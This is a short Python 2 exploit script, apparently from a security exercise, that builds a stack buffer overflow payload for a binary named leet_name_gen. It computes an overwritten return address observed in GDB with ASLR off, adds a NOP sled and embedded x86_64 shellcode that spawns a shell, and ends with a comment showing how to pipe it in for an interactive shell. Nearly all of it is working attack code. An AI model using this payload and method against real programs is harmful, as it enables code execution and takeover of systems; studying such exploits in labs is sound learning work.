#!/usr/bin/env python2

import binascii
import time

if False:  # Set this to True to have the time to start and setup GDB
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass

# For this binary, the return address (from main to
# libc_start_main) is 72 bytes ahead of the start of
# the vulnerable buffer (observed with GDB).
bytes_to_ret_addr = 72
nop_sled_size = 128
# With ASLR disabled, we observed with GDB that the
# vulnerable buffer starts at this address.
buf_addr = 0x00007fffffffe810
# Compute a new return address so that it points in the middle
# of the NOP sled.
ret_addr = buf_addr + bytes_to_ret_addr + 8 + nop_sled_size / 2
ret_addr_str = "%016x" % ret_addr

# Fill arbritrary characters in "char buffer[0x32]", up to
# the stack location immediately before the return address
# (return from main to libc_start_main), but also insert a
# string terminator to make sure that the generate_l33t_name()
# function does not corrupt the stack.
content = 'A' * (bytes_to_ret_addr/2)
content += '\00' * (bytes_to_ret_addr/2)

# Append the return address (in little endian)
content += binascii.unhexlify(ret_addr_str)[::-1]

# Append the NOP sled
content += '\x90' * nop_sled_size

# Append the shellcode (just google x86_64 shellcode)
content += "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

# Output on stdout
print(content)

# Command:
#
#  $ ( ./crack.py; cat ) | ./leet_name_gen
#
# The ./crack.py produces the buffer content that causes buffer overflow
# and injects the shellcode.
# The 'cat' command is used to keep stdin and stdout open once the
# shell is open, so that it is possible to interact with it.
